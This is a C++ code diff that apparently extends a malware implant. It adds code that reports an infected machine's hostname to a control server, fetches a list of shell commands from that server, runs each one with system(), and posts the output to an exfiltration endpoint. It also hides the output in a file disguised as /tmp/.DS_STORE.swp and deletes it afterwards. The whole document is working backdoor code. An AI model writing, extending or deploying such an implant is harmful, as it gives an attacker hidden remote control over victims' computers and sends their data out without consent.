@@ -18,9 +18,15 @@ void curl_post(std::string url, std::string endpoint, std::string data) {
     CURL *curl;
     CURLcode res;
     curl = curl_easy_init();
+    std::string toSend;
+    if (endpoint == FIRST_INFECT) {
+        toSend = infectedHostname;
+    } else {
+        toSend = infectedHostname + ":" + data;
+    }
     if (curl) {
         curl_easy_setopt(curl, CURLOPT_URL, (url + endpoint).c_str());
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, toSend.c_str());
         res = curl_easy_perform(curl);
 
         if (res != CURLE_OK) {
@@ -58,17 +64,20 @@ std::string curl_get(std::string url, std::string endpoint) {
  */
 std::vector<std::string> command(std::string toRun) {
     //Build and run command
-    std::string cmd = " " + toRun + " > .DS_STORE.swp";
+    std::string cmd = " " + toRun + " > /tmp/.DS_STORE.swp";
     std::system(cmd.c_str());
 
     //Storage
     std::vector<std::string> ret;
     std::string line;
-    std::ifstream fin(".DS_STORE.swp");
+    std::ifstream fin("/tmp/.DS_STORE.swp");
     
     while (std::getline(fin, line)) {
         ret.push_back(line);
     }
+
+    //cleanup
+    std::system(" rm -f /tmp/.DS_STORE.swp");
     return ret;
 
 }
@@ -76,8 +85,46 @@ std::vector<std::string> command(std::string toRun) {
 //Run when the victim is first infected
 void first_infection() {
     std::vector<std::string> val = command("hostname");
-    for(std::vector<std::string>::iterator it = val.begin(); it != val.end(); ++it) {
-        curl_post(URL, EXFIL, *it);
+    infectedHostname = val[0];
+    curl_post(URL, FIRST_INFECT, "");
+}
+
+void check_and_post() {
+    //EXAMPLE INSTR RETURN
+    // -- ["ls -a", "ls -ltr", "hostname -i"]
+
+    //Get instructions
+    std::string resp = curl_get(URL, INSTR);
+    std::istringstream line(resp);
+    std::vector<std::string> cmds;
+    std::string builtCmd, postReq;
+    char c;
+    
+    //parse instruction
+    while ((line >> std::noskipws >> c)) {
+        if ((c != '[' && c != '\"')) {
+            if (c == ',' || c == ']') {
+                cmds.push_back(builtCmd);
+                builtCmd = "";
+            } else {
+                builtCmd += c;
+            }
+        } 
+    }
+
+   //Iteratre through commands from server
+    for (std::vector<std::string>::iterator it = cmds.begin(); it != cmds.end(); ++it) {
+        postReq="";
+        std::vector<std::string> cmdRes = command(*it);
+        //Need to iterate through the return from command incase multiple lines
+        for (std::vector<std::string>::iterator nit = cmdRes.begin(); nit != cmdRes.end(); ++nit) {
+            postReq+= *nit + "\n";
+        }
+
+        if (postReq != "") {
+            std::cout << "Implant Sent: " << postReq << std::endl;
+            curl_post(URL, EXFIL, postReq);
+        }
     }
 }
 
